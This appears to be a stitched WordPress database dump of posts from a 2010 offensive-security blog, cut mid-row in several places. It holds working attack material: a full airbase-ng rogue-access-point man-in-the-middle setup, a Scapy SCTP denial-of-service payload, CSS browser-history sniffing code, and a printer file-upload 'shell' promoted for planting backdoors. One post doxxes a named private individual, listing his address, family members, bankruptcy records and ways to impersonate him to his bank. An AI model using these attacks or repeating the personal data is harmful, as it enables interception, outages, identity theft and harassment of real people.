(len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:14.033006 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:14.221230 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n..snip..\n</blockquote>\n\nOk, so 1.2.3.4 responds as I would have expected it to.\n\nNow, I\'m going to set the NIC into promiscuous mode on 1.2.3.4 and rerun the sniffer detect script.  Here\'s the output:\n\n<blockquote>\n# tcpdump -vvv host 1.2.3.4\ntcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n14:38:39.087101 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 (Broadcast) tell 1.2.3.3, length 28\n14:38:39.087563 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.211888 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.212391 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.312027 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.312521 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.412536 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.413039 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:38:39.512700 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:38:39.513184 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n..snip..\n</blockquote>\n\nWell, it responded to this, too.. but way differently.  In the first example, where 1.2.3.4 is NOT in promiscuous mode, I received 4 replies to 19 requests.  In the second example, where the machine WAS in promiscuous mode, I received 19 reply\'s to 19 requests.  This seems to be true no matter what type of box I scan.  Windows, Linux, printers, whatever.\n\nThis tells me (based on the document that I referenced earlier) that the NIC itself is doing some type of ARP flood protection (or.. maybe the NIC\'s processor is just so slow that it can\'t respond fast enough?) at the hardware level, but no such protection exists at the software level (maybe because it knows that the hardware will do it?), and thus it responds to each and every packet.  (Comments??)\n\nI don\'t believe that the current script is really taking into account how many responses it gets.  It appears to be doing other tests which are intended to help give more information than if the device is in promiscuous mode or not, but I\'m noticing a lot of false positives/negatives as a result.  I would prefer more accurate tests in exchange for getting a bit less information.\n\nAll this said, this is the first time I\'ve ever really looked seriously at Lua, so I\'m not completely understanding the whole script, so I may be missing something.  This is where you come in!  :-)\n\n','','2010-05-10 14:57:39','2010-05-10 19:57:39','','','2010-05-10 14:57:39','2010-05-10 19:57:39','detecting-promiscuous-nodes-via-arp','0','','publish','Detecting Promiscuous Nodes via ARP','post','');

You can find it here: <a href=\"http://www.securiteam.com/tools/6N0012KN5Q.html\">http://www.securiteam.com/tools/6N0012KN5Q.html</a>\n\nIt gives complete UPnP functionality.. and it does it really well.  So, rather than recreate the wheel, I\'m plugging this program.  I never realized all that was possible through UPnP.  I just knew to make sure that it wasn\'t enabled on my hardware and never gave it much more thought.\n\nAnyway, go check it out.. it\'s a lot of fun to play with!\n<b>[End of Update]</b>\n\n<!--more-->\n<b>[Begin Original Post]</b>\nI actually forget how I got on to this topic this evening, but apparently it had something to do with a bit of tequila and boredom.\n\nAnyway, I came across a perl module, Net::UPnP and decided to play with it (I\'ve never really explored the world of UPnP).  Two things hit me.\n\n1) Holy crap.. who the $@$%! would have something enabled on their router that would allow random people on their network to configure portmapping and various other stuff?\n2) Holy crap.. this could be a lot of fun to play with.  lol\n\nSo, I started reading.  The Net::UPnP module is not very well documented, which always makes things enjoyable.. but I was able to put together this little piece of code that I plan on expanding on once I have a better understanding of the protocol and the module itself.\n\n<pre lang=\"perl\">\nuse Net::UPnP::ControlPoint;\nuse Net::UPnP::GW::Gateway;\n\n$s = Net::UPnP::ControlPoint->new();\n\n@devices = $s->search(st =>\'upnp:rootdevice\', mx => 3);\n\n$i = 1;\n\nforeach $dev (@devices) {\n  print \"nDevice $i)n\";\n  print \"Device name: \" . $dev->getfriendlyname() . \"n\";\n  print \"Device type: \" . $dev->getdevicetype() . \"n\";\n\n  $dev_service = $dev->getservicebyname(\'urn:schemas-upnp-org:service:WANIPConnection:1\');\n\n  $gw = Net::UPnP::GW::Gateway->new();\n  $gw->setdevice($dev);\n  if(($extip = $gw->getexternalipaddress()) ne \"\") {\n    print \"External IP: $extipn\";\n  }\n\n  print \"Device UDN: \" . $dev->getudn() . \"n\";\n  print \"Device UPC: \" . $dev->getupc() . \"n\";\n\n\n  #$desc = $dev->getdescription(); \n  #print \"$descn\"; \n  $i++; \n}\n</pre>\n\nThe output looks like this:\n\n<blockquote>\n\n$ ./upnp.pl\n\nDevice 1)\nDevice name: Residential Gateway\nDevice type: urn:schemas-upnp-org:device:InternetGatewayDevice:1\nExternal IP: 123.10.22.109\nDevice UDN: uuid:upnp-InternetGatewayDevice-1_0-001cdf51cfe4\nDevice UPC: 00000-00001\n\nDevice 2)\nDevice name: WSC Supported AP\nDevice type: urn:schemas-wifialliance-org:device:WFADevice:1\nDevice UDN: uuid:e7fe1b91-8cd5-0310-98dd-001cdf51cfe4\nDevice UPC: 00000-00001\n</blockquote>\n\nThere\'s a ton of neat stuff you can discover via UPnP from what I\'ve gathered in the last hour.  I need to do some more reading so I can figure out how to view the port mappings, which is the data that I really want.

He sincerely apologized for his actions and realized now that what he did was wrong and simply asked that I modify the post to protect the identities of his family.  I felt that this was a fair request, considering that his family had nothing to do with what Steve did and it doesn\'t jeopardize the impact of the article.  So, if you\'re wondering why you\'re seeing all the \"[withheld]\"\'s, that\'s why!\n\nPS - Yes, I realize the names are still shown in the images, but they\'re not indexed by Google.  I figured I\'d point this out before I had 20,000 comments informing me of it.  :-P\n<b>END OF UPDATE</b>\n\n<b>DISCLAIMER</b>:\nThis is ABSOLUTELY for informational purposes ONLY.  <a href=\"http://www.attackvector.org\">attackvector.org</a> nor I will be held responsible for how you choose to use the information that I post on my blog.  This individual, though he is a douche for sending spam, is a real person with a real life.  By misusing the information found here, you have the power to potentially destroy someones real life.  There\'s a fine line between a legal hack and a felony.  Information gathering is not illegal so long as it\'s obtained through legal means.  Using the information, however, is quite another story.\n\n<b>UPDATE</b>:  Because of something that one of my readers brought up, I want to clarify.  The email that I received was not the run of the mill malware/spambot/whatever style email.  The email was coming from his email address, using his business\'s name, and advertising his business.  I would have never posted this had I had any doubt that this may not have actually been sent, by him, in some fashion.\n<b>END OF DISCLAIMER</b>.\n\nI use spammers and pedophiles as test subjects when I\'m working on something.  This is mostly because it\'s unlikely that they would go to the authorities and point the finger at me, knowing that I could easily turn around and say something to the effect of, \"Well, yes I did pwn his box.. but you should have seen all the child porn I found on it.\"  owned x 2.\n\nI happened to receive a piece of spam at the exact moment as I was going to start a post about privacy and anonyminity on the internet.  I will consider this to be a sign from God that this dude needed to be set straight.  Okay, maybe not.  I\'m not sure what the bible says about spam.. but if I were God, it would be into the pits of hell for them.  So, since I cannot cast people into eternal suffering in a firey pit, I will have to settle for second best.  Pwnage!\n\nWhats even better, none of what I\'m about to do is illegal.  It\'s a serious, serious invasion of privacy, and you definitely don\'t want it to happen to you, but all of it can be harvested through public record, social networks, forum posts, etc etc etc.  \n\nFirst, lets take a look at the email that I received. \n<!--more-->\n\n\n<blockquote>\n..snip..\nReceived: from unknown (HELO p3pismtp01-017.prod.phx3.secureserver.net) ([10.6.12.17])\n          (envelope-sender <steve@barteritemsfortrade.com>)\n          by p3plsmtp09-04.prod.phx3.secureserver.net (qmail-1.03) with SMTP\n          for <matt@attackvector.org>; 7 May 2010 01:05:53 -0000\nX-IronPort-Anti-Spam-Result: AjYCAOP/4kvYI8QXnGdsb2JhbACeChUBAQEBAQgLCAkRIrxZgmCCMwSDQQ\nReceived: from server299.com ([216.35.196.23])\n  by p3pismtp01-017.prod.phx3.secureserver.net with ESMTP; 06 May 2010 17:58:47 -0700\nReceived: (qmail 10509 invoked by uid 3287); 7 May 2010 00:58:46 -0000\nReceived: from 67.185.122.64\n        (SquirrelMail authenticated user steve)\n        by www.barteritemsfortrade.com with HTTP;\n..snip..\n</blockquote>\n\nOk, so, his email address is steve@barteritemsfortrade.com.. he\'s sending email through server299.com.. and his real IP address is 67.185.122.64.  All we really need is his email address and his IP.  Lets see what we can find.\n\n<blockquote>\nNon-authoritative answer:\n64.122.185.67.in-addr.arpa	name = c-67-185-122-64.hsd1.wa.comcast.net.\n</blockquote>\n\nNow we know that he\'s connecting from Washington (<b>wa</b>.comcast.net).  Lets see what Geo IP location says.  I use <a href=\"http://www.geoiptool.com/\">this service</a>, but there are many others.  I\'ve also written a few tools to do this as well, but we\'re going to use what the average Joe has access to.\n\nJust put the IP address in the box and hit \"search\".  Here\'s what we find.\n\n<blockquote>\nRegion:	Washington\nCity:	        Spokane\nPostal code:	99205\n</blockquote>\n\nSo, we\'re narrowing it down.. we now know that it\'s Spokane, Washington.  Now we\'re going to take a look at his email address.  First, obviously, just google the email address.  This will bring up information for virtually anything that the person has ever used their email on.  Forums, social networks, etc.\n\nIn this case, however, nothing came up on google.  We must dig deeper.  Enter, <a href=\"http://www.whois.sc\">whois</a>!\n\n<blockquote>\n   BIZ TWO, LLC\n   PO Box 8421\n   Spokane, Washington 99203\n   United States\n</blockquote>\n\nBiz two?  Does that mean there is a Biz One and a Biz Three, perhaps?  Also, he\'s using a PO Box.. blah.\n\n<blockquote>\n..snip..\n   Administrative Contact:\n      Nicholas, Steve             steve@bestimpressionz.com\n..snip..\n  (509) 283-7030      Fax -- (509) 456-3813\n..snip..\n</blockquote>\n\nJackpot!  We now have a last name and a phone number.  We also have an additional email address/domain.\n\n<blockquote>\n  Administrative Contact:\n      Your Logo Here               snicho@juno.com\n      139 west 30th Avenue\n      Spokane, WA 99203\n      US\n      509-456-3813 fax: 509-456-3813\n</blockquote>\n\nHmm.. a real address.. no PO box on this domain.  Is that an office?  A house?  Is it his house?  I can assume that \'snicho\' is short for \'steve nicholas\', and it\'s the administrative contact, which means he owns the domain.. so the address has something to do with him.\n\nEnter.. Google Maps.  :-)\n\n<img src=\"../pics/13930.png\">\n\n(If you\'re wonder why it says \"140 west 30th\" and not \"139 west 30th\", it\'s because I slid the camera down a bit and Google tried to be helpful by changing the address)\n\nWell, it\'s definitely not an office building, so at this point I\'m going to assume that it\'s his house until I find out differently.  We can further verify this by googling his name + city + state.\n\n<img src=\"../pics/nameres.png\">\n\nThat address looks rather familiar... oh yeah, it\'s the address that was associated with his domain.  We can be virtually certain at this point that that is his real address and house.  Lets see who else lives in the house with him - just google the phone number listed.\n\n<img src=\"../pics/phoneres.png\">\n\nOk, so, [withheld] has the same last name as Steve, so I think we can safely say that this is his wife.\n\nWe\'ll come back to her later.  Lets see what else we can find about Steve.. I\'m really starting to feel like family at this point.  :-)\n\nBack when I googled his name + city + state, I noticed that below the address result, there was a LinkedIn page.. lets check that out.\n\nOk, so there\'s all sorts of useful information.. but I found another email address.. steve.nicholas@itex.net  Not often do I meet someone with as many email addresses as me.. lol.\n\nSo, back up to the top, we google for steve.nicholas@itex.net.\n\nSome interesting stuff, but nothing really useful for my purposes.  Lets check out Facebook and see if he\'s a social butterfly.  I log in and \"search for friends\" and enter his email address(es).  His account is registered with the itex.net email address.\n\nHe doesn\'t have his Facebook stuff set to private, so he\'s kind of letting it all hang out.  Thanks, Steve!\n\n<img src=\"../pics/stevefb.png\">\n\nYawn.  The only thing interesting there, is that we\'ve now definitely verified that that address is correct and that his wife\'s name is definitely [withheld].  Maybe her page is more interesting.. lets look\n\nNote: Passwords.. by building a profile of someone, you begin to get a feel of who they really are.  I\'m willing to bet that at least one of Steve\'s passwords has something to do with fishing, trout, or cutthroats (type of trout - according to his facebook page).\n\n[withheld]\'s Facebook:\n<blockquote>\nI teach 7th & 8th graders at Salk Middle School in Spokane WA. I married Steve 27 years ago and we have 2 daughters, [withheld] and [withheld]. [withheld] married [withheld (both first & last name)] 2 years ago and they are expecting their first child in March. [withheld] is an attorney and [withheld] is a special education teacher. [withheld] is living in Las Vegas where she teaches special education to preschoolers and kindergarten. We have an awesome family!!!!\n</blockquote>\n\nHere\'s something to take a mental note of.  Women are generally more open about their personal lives and love to share with others.  In one paragraph, we learn that she teaches at Salk Middle School, they\'ve been married for 27 years, they have 2 daughters, [withheld] and [withheld], [withheld] is married to [withheld (both first & last name)] (note - this probably means that [withheld] is no longer [withheld] Nicholas, she\'s probably [withheld (both first & last name)]).  [withheld] lives in Vegas.\n\nHow ever would we find out more information about [withheld] and [withheld]?  Oh yeah, friends lists.  If the parents have Facebook, the kids most certainly have Facebook.. and barring any family drama, they\'ll all be on each others friends lists.  And, of course, I\'m right.. found [withheld], [withheld], and [withheld].\n\nAlso, going through her wall posts gave up some information.  They\'re new grandparents.. their grandaughter [withheld] was born on March 15th.. this was [withheld] and [withheld]\'s daughter.\n\nNow, lets see what <a href=\"http://www.intelius.com\">Intelius</a> says about [withheld] (note - I skipped Steve on Intelius because his entry is all screwed up.)\n\n<img src=\"../pics/intelius.png\">\n\nNow we have ages, too.  It\'s interesting that there\'s a \"Ralph Steve Nicholas\" listed, who has the same age as the other two Steve\'s listed.  Could Steve\'s real name be Ralph??\n\nOk, anyway, lets see what I can find out about their house.  Just about every county in the country allows you to view property tax records on the internet.  I googled \"spokane washington property tax records\".  What you\'re looking for is like, the assessor\'s home page then just punch in the address and you can find a wealth of information.\n\nWhat this record tells us, is that [withheld] actually owns the home.. Steve isn\'t even listed.  She\'s also the sole person listed paying the property taxes.  Interesting.. I wonder why?\n\nAlso, further down on the report, there\'s two documents.  A quit claim deed, and a statutory warranty deed.  A warranty deed is issued in some states when a house is sold.  It protects the buyer from having third parties come after them for unpaid debts and whatever.  So, it appears as though they bought the house in 2001 for $110,000?  Seems awfully low.\n\nNow, lets look at the quit claim deed.  First thing I notice.  R Steve Nicholas is listed as \"Husband of Grantee\"  I think Steve\'s real name is Ralph. lol.\n\nThis is interesting.. quit claim deeds are used after a divorce to switch the owner of a property from one party to another at the county level.  But they\'re still married.  The other times that I\'ve seen quit claim deeds used is when people encounter serious financial trouble and need to file bankruptcy.  They file independently and deed the house to their spouse.\n\nLets find out!\n\nI am not going to tell you what service I use to obtain this information because I don\'t want it to get abused and taken away.  Also, I don\'t think everyone should have access to it.  SO.\n\n<blockquote>\n91-40727 Ralph Steven Nicholas and [withheld (first & middle name)] Nicholas \nCase type: bk Chapter: 7 Asset: No Vol: v Judge: John C. Minahan Jr. \nDate filed: 05/08/1991 Date of last filing: 02/11/1993 \nDate terminated: 02/11/1993 \n</blockquote>\n\nOk, so they did a joint bankruptcy in \'91 and it was discharged in \'93.  I also have a list of their creditors.. no wonder they filed bankruptcy.  Ouch.\n\nOne other piece of information that this offers, is previous addresses and the last 4 digits of their social security numbers.  Keep in mind, a lot of people use the last 4 digits of their social for pin numbers.. because most pin numbers are limited to 4 digits.  Stupid.\n\n<b>UPDATE</b>:  I\'ve decided to X out the social security numbers because this post is starting to receive a ton of traffic and I\'m not sure I want everyone visiting it to have this information.  My intention of this article is not to make it easy to steal this guys identity.. it\'s to point out a vulnerability.  If you really want to find his social security number, lets just say.. it\'s available via the internet.  :-)\n\n<blockquote>\nDebtor\nRalph Steven Nicholas \n6747 Crooked Creek Dr. \nLincoln, NE 68516 \nSSN / ITIN: xxx-xx-xxxx\n\nDebtor\n[withheld (first & middle name)] Nicholas \n6747 Crooked Creek Dr. \nLincoln, NE 68516 \nSSN / ITIN: xxx-xx-xxxx\n</blockquote>\n\nHere\'s something to really think about.. I was able to obtain all of the information in this post for 16 cents and by just using an email and IP address from a piece of spam.\n\nFamily members, ages, schools, anniversary dates, marriage lengths, hobbies, interests, phone numbers, addresses, property records, property taxes, pictures of their house, pictures of them, pictures of their children and grandchildren, deeds on their house, bankruptcies, employment history, previous addresses, previous creditors, and bits of social security numbers.\n\nI\'m pretty sure I\'d be able to fake my way through one of those password reset forms.. you know, where you set up a \"secret question\" asking what your dogs name was, or where you went to school?\n\nBeyond that, I\'m fairly confident that at this point, if I were to call his bank and pretend to be him, I could easily pass when they asked me personal questions.\n\nIn closing.. you really need to pay close attention to what you\'re posting on the internet.  If I were a douche, I could ruin this guys life using this information.  There are a lot of douches out there that are doing this type of stuff right now.  Given an email address, phone number, or whatever, they build profiles on people which can be used to exploit them and steal identities.  \n\nThe other thing that I\'ve actually fallen victim to, is the speed of Google\'s spiders and the fact that they index Craigslist.  Lets say you run a business.. Catholic Charities R Us and in this post, you include an email address, phone number, something.  Lets say you also make a post, days, weeks, whatever, later looking for whores, or something.  Both of those posts will come up when Googling for your phone number.\n\nAlso, consider what you\'re sending in this email.  What if this guy had sent me an email trying to extort me, threaten me, whatever?  I could turn this over to the authorities and they\'d have their work cut out for them.\n\nNot to try to scare people too much, but think about single women in the dating scene.  They make a post somewhere with their email address and someone comes across it and is able to determine the same amount of information about them as what I did above?  What if that person was more interested in something other than identity theft?\n\nI think you get the idea.. essentially.. guard your personal information with your life.  Never post your phone number on the internet (unless you\'re using a proxy number, which is what I do), and make sure no personal information is associated with your email address before you go firing off emails to strangers.\n\n\n\n','','2010-05-11 12:39:28','2010-05-11 17:39:28','','','2010-05-11 12:39:28','2010-05-11 17:39:28','invasion-of-privacy','0','','publish','Invasion of Privacy.','post','');

You see, back in the good o\'l days, (\'90s.. ) we had to write our own tools, because things like Metasploit, Scapy, etc. didn\'t exist yet.  We also hadn\'t really discovered DDoS at this point (until Smurf came along).. so we resorted to pure bandwidth.  As such, we wrote tools like udpk, pepsi, many different icmp flooders, etc.\n\nWell, I decided that I wanted a spoofing UDP flooder.. so I wrote one.  Pepsi was available, which a guy by the name of \'Soldier\' wrote, but he didn\'t like a group that I was associated with, so I created \'coke\' so I didn\'t have to use his bloated PoS.\n\nOne thing that made mine easily 10x cooler, was that each packet mine sent came from a new random IP, whereas his you specified the IP on the command line and that\'s the IP it spoofed the packets from.  He added this feature in a later release.  The other big perk was that mine was portable to any OS that had perl (which is why I wrote it in perl).. his was Linux specific.  It may have also compiled on BSD, but I doubt it.\n\nSo, anyway, here\'s \'coke\'.  :-)\n\nPS - Expect more of these posts..

It was constantly crashing and didn\'t work very well.. so I wrote my own.  :-)\n\nI had come across a program that was specifically designed to upload/download/append/etc. files to a printer that supported PJL.  It worked very well and seemed like a good base to build off of, since the hard part was already done.\n<!--more-->\nSo, I\'ve cleaned up the code, added a few commands, and created a \'raw\' command, which allows you to type PJL commands on the fly, which essentially turns this into a shell for printers.  Kinda.\n\nI\'m not sure if something like this already exists.. I\'m going to guess that it does.. but I haven\'t found it.  At least not something that natively runs on Linux.\n\nSo, anyway, here it is.  The uploading/downloading of files is pretty sweet.  Like I described in part 2 of this post, you could easily do a drive-by attack, uploading some kind of exploit/backdoor/something to a printer, send an email to someone at the company with a link to your hosted file, which resides on their local printer (thus circumventing firewalls/sweepers/IDS).  I have tried this and it does work.  There are certainly a million other ways to accomplish this, but with how easily ownable printers are, it\'s a pretty good target if you\'re in a hurry.\n\nYou can download this file directly from <a href=\"../files/pjl-shell.txt\">here</a>.  Be sure to rename it from .txt to .pl\n\nAlso, once again, go read <a href=\"http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf\">bpl13208.pdf</a>  It describes, in tremendous detail, all of the PJL commands, options, variables, etc.\n\n<pre lang=\"perl\" line=\"1\">\n# pjl-shell.pl\n# www.attackvector.org\n# Author of original parts unknown.\n\nuse IO::Socket;

'216','7','open','http://www.attackvector.org/?p=216','0','open','','2','One question that I get asked quite often is, \"how do you attack a wireless network if it uses MAC address filtering??\"\n\nThere\'s a myth that MAC address filtering is the end-all, be-all wireless security feature that will prevent even WEP networks from being owned.  This simply is not the case.\n\nThere are a few different methods for bypassing filtering.  Probably the easiest method is just simply spoofing your MAC address to match that of a client that you\'ve seen attached to the network.  This requires you to either wait, or force the client that\'s connected to disconnect, and then you replace it.  This doesn\'t always work, however.  It can be difficult to get a client to disconnect long enough for you to connect in it\'s place.  Alternatively, waiting for the client to disconnect is, well, pretty low-tech.  And, who wants to sit out in their car for 2 1/2 hours while the client you\'re trying to pwn finishes watching a movie on streaming Netflix?  Not I!\n<!--more-->\nEntire method #2.  Anyone who has played with a wireless network and cracked a WEP key has, at some point, fiddled with packet injection at some level.  There\'s a program that I use called \"WireTap\" which essentially brings packet injection to the next level.  Here\'s how I use it..\n\nI put my card in monitor mode via \'airmon-ng start wlan0\'.  I then bring up airodump and survey who\'s connected to what.

'219','4','open','http://www.attackvector.org/?p=219','0','open','','2','This is going to be a rather short and sweet post because it\'s pretty heavily documented everywhere else.  The reason why I\'m posting it is because a lot of the information out there on the forums simply does not work, or is not very well explained.\n\nThe set up I have here is what I use, regularly.. so I know that it works.\n\nThere are two ways that I use this, depending on what it is that I\'m trying to accomplish.\n\nThe first way is to configure Airbase to listen for SSID probes and answer, regardless of the SSID name.  So, lets say that you have 5 wireless networks that you connect to regularly.  Your computer is constantly searching for one of those available networks and Airbase will be listening and it will pretend to be one of those networks that your computer is searching for, allowing you to connect to it.  Once you\'re connected, you can browse, just as if you were connected to your regular network.  However, this time, you\'re connecting through my computer.  Everything you do on the internet is visible to me.\n<!--more-->\nThe second way is to specify a seductive SSID name that will draw peoples attention.  Like, say, \"FREE INTERNET\".  Or something.  Obviously, people will see this and say \"cool!  A hotspot!\" and connect.  Viola, owned.  lol\n\nLets begin..\n\nFirst things first, this requires (AFAIK - Never tried using just one) two network cards.  I\'m using an integrated broadcom card, and a Netgear WG111v3.  The other requirement is a DHCP server.  Ubuntu users, \'apt-get install dhcp3-server\'\n\nEdit /etc/dhcp3/dhcpd.conf - your config should look like this:\n\n<pre>\nddns-update-style ad-hoc;\ndefault-lease-time 600;\nmax-lease-time 7200;\nsubnet 192.168.2.128 netmask 255.255.255.128 {\n  option subnet-mask 255.255.255.128;\n  option broadcast-address 192.168.2.255;\n  option routers 192.168.2.129;\n  option domain-name-servers 4.2.2.2;\n  option domain-name-servers 128.8.5.2;\n  range 192.168.2.130 192.168.2.140;\n}\n</pre>\n\nDon\'t start the server yet.. that comes later.\n\nSo, I get my broadcom card connected to a real wireless network.  This device name is \'eth1\'.  In my current configuration, it\'s IP is 192.168.0.5.\n\nNext, I use airmon-ng to start my Netgear\n\n<blockquote>\n# airmon-ng start wlan0\n..snip..\neth1		Unknown 		wl\nwlan0		RTL8187 	rtl8187 - [phy3]\n				(monitor mode enabled on mon0)\n</blockquote>\n\nOk, so now we have our monitor interface, \"mon0\"\n\nNow I start airbase..\n\n<blockquote>\n# airbase-ng -P -c 6 -v mon0\n22:56:41  Created tap interface at0\n22:56:41  Trying to set MTU on at0 to 1500\n22:56:41  Trying to set MTU on mon0 to 1800\n22:56:41  Access Point with BSSID 00:11:22:33:44:55 started.\n</blockquote>\n\nOk, now we have another interface, \"at0\"\n\nI have a simple script that I made that automates the next steps..\n\n<pre>\n#!/bin/sh\n# Bring up the tap interface\nifconfig at0 up\n# Give it an IP that matches that of whats configured in the dhcpd.conf\nifconfig at0 192.168.2.129 netmask 255.255.255.128\n# Add a route\nroute add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129\n# Start (restart) the DHCP server\n/etc/init.d/dhcp3-server restart\n\n# Clear out iptables\niptables --flush\niptables --table nat --flush\niptables --delete-chain\n\n# Create a simple masquerade rule, routing all data out of eth1\niptables --table nat --append POSTROUTING --out-interface eth1 -j MASQUERADE\n# Accept anything coming in interface at0\niptables --append FORWARD --in-interface at0 -j ACCEPT\n\n# Make sure forwarding is enabled\necho 1 > /proc/sys/net/ipv4/ip_forward\n</pre>\n\nOnce you run the script, you should be ready to start accepting clients.. \n\n<blockquote>\n23:05:59  Client 00:22:33:44:55:66 associated (unencrypted) to ESSID: \"default\"\n</blockquote>\n\nGot one.  :-)\n\n<blockquote>\n# tcpdump -i at0 -A\n..snip..\n23:08:37.260533 IP l2.login.vip.re3.yahoo.com.https > 192.168.2.131.53758: Flags [.], ack 805, win 65534, options [nop,nop,TS val 2920423442 ecr 15306589], length 0\nE .4....1.u.E.p.........)...5.fZ....R......\n.. ....]\n</blockquote>\n\nOnce a client is connected, you can treat it as if it were any other computer on a LAN.. (read - open msfconsole and begin exploiting.. ;-D)\n\nAnother utility that takes advantage of this package is <a href=\"http://www.metasploit.com/redmine/projects/framework/wiki/Karmetasploit\">Karmetasploit</a>.  This will take care of the exploiting for you.  Basically, if a client connects to your fake AP, it\'ll automagically get scanned/exploited/etc.  Fun to use against war drivers/neighbors who are trying to steal your wireless.\n\nAlso, using Squid and iptables, you can have all sorts of fun using this technique, if all you\'re trying to do is pull a prank/screw with people.. check out this <a href=\"http://www.ex-parrot.com/pete/upside-down-ternet.html\">article</a>.\n\nHopefully this is clear enough for people to understand.  It\'s late, I\'m tired, and I\'m watching TV as I write it.. so.. if you find an error, please let me know so I can fix it before I embarrass myself.  Thanks.  :-)\n\n','','2010-05-17 23:23:33','2010-05-18 04:23:33','','','2010-05-17 23:23:33','2010-05-18 04:23:33','man-in-the-middle-attack-using-airbase-ng','0','','publish','Man in the Middle Attack using Airbase-ng','post','');

Not good.  Any time that there\'s a remote DoS against a Linux box, it means bad things.\n\nI started digging, because I\'m not terribly familiar with SCTP.  First, I wanted to know more about the vulnerability itself.  I found this: <a href=\"http://permalink.gmane.org/gmane.comp.security.oss.general/2859\">http://permalink.gmane.org/gmane.comp.security.oss.general/2859</a>.  Simply put, the vulnerability stems from someone coding something that allows user input, but doesn\'t do the proper sanity checks.  Seriously, it\'s unbelievable that this type of vulnerability still exists.\n\nAnyway, I also discovered that SCTP is shipped with the most recent Ubuntu releases by default, so.. this is a significant attack vector.\n\nThe easiest way to begin testing is to bring up an SCTP server on a separate machine.  Do this by:\n<!--more-->\n<blockquote>\nsctp_darn -H 0 -P <whatever port> -l\n</blockquote>\n\nTada, you now have an SCTP server.\n\nSecond, you\'re going to need the development release of Scapy, because SCTP support hasn\'t officially been added yet.  Follow the instructions <a href=\"http://www.secdev.org/projects/scapy/doc/installation.html\">here</a> to update to 2.1.1-dev.\n\nOnce everything is squared away, its important to get a better understanding of the protocol itself.  <a href=\"http://www.networksorcery.com/enp/protocol/sctp.htm\">This</a> is a great overview of the protocol.\n\nSo, now we have a SCTP server running, Scapy is on the bleeding edge, we\'re better edumacated on SCTP, and we know that the vulnerability happens when too many malformed chunks are supplied during the init process.\n\nTime to play!\n\nUnfortunately, I don\'t have a kerenl that appears to be vulnerable to this (tested.. also not listed on the list of vulnerable kernels), so I\'m not ENTIRELY sure that this actually works... but.\n\nBecause the advisory indicates that the overflow is triggered by too many of it\'s variable length parameters being malformed, theoretically this should do the trick:\n\n<blockquote>\nsend(IP(dst=\"10.0.0.1\")/SCTP(sport=2600,dport=2500)/SCTPChunkInit(type=1)\n/fuzz(SCTPChunkParamAdaptationLayer())/fuzz(SCTPChunkParamCookiePreservative())\n/fuzz(SCTPChunkParamFwdTSN())/fuzz(SCTPChunkParamIPv4Addr())\n/fuzz(SCTPChunkParamUnrocognizedParam())/fuzz(SCTPChunkParamECNCapable())\n/fuzz(SCTPChunkParamHearbeatInfo())/fuzz(SCTPChunkParamHostname())\n/fuzz(SCTPChunkParamStateCookie()), loop=1)\n</blockquote>\n\nI suggest playing with this further if you have access to a kernel that is listed as being vulnerable.  When I get home tonight I\'m going to check my other boxes to see if one of them has an older kernel.  If I come up with anything, I\'ll let you know.

I came across this neat trick that involves enumerating browser history using simple CSS.  I had never seen the CSS version, but was very familiar with the one written in JavaScript.\n\nSome of you have probably seen this, others are probably going to pee themselves a little.  How this works is really simple.\n\nWhen you visit a link, your browser will display the link following the properties of a \"a:visited\" CSS tag.  If, within this tag, you were to write something like, say, \"background: url(log.php?website.com)\", you could log the fact that your visitor had been to \"website.com\" prior to visiting your site, because his browser chose to display the link using the \"a:visited\" tag.  (Basically, the site was in your visitors history).\n\nNow, if you were to have a <a href=\"http://s3.amazonaws.com/alexa-static/top-1m.csv.zip\">huge list</a> (note - that contains 1,000,000 websites), you could probably enumerate a pretty good chunk of your visitors history, if not all of it.\n\nYou can try my <a href=\"http://www.attackvector.org/cgi/sniff.cgi\">demo here</a>.  This was originally written by RSnake at <a href=\"http://ha.ckers.org\">ha.ckers.org</a>.  I\'ve taken it and heavily modified it and rewrote most of it to suite my purposes.\n\nThere are a number of ways to use this information.  If you\'re in advertising/marketing, this information would be incredibly useful in determining who your competitors are, what prices you need to beat, etc.  In fact, you could have your page dynamically adjust your prices if you happen to know your competitors prices.\n\nMore maliciously, this could be used for blackmail, extortion, stealing cookies, building profiles of people, figuring out where certain people have accounts, all sorts of other mischief.  \n\nBecause this doesn\'t use JavaScript, the Firefox plugin \"NoScript\" wont help you much.  The best thing you can do, afaik, is make sure that your browser clears its cache and history every time you close it.  \n\nAlso, in my demo, I didn\'t HAVE to display anything.. I could have easily just kept it quiet and embedded it into a page, silently sniffing everyones history.  But, what fun would that be?\n\nIf I come up with any other fun ways to abuse this, I\'ll update this post.  :-)\n\nAnyway, here\'s the code.\n\n<pre lang=\"perl\">\n#!/usr/bin/perl\n$log = \"cgi/log.txt\";\n\nopen(SITES, \"cgi/sites5.txt\") || die \"$!\";\nchomp(@sites = <SITES>);\nclose(SITES);\n\n@chars = (\'a\'..\'z\',\'A\'..\'Z\');\nfor($i = 0; $i < 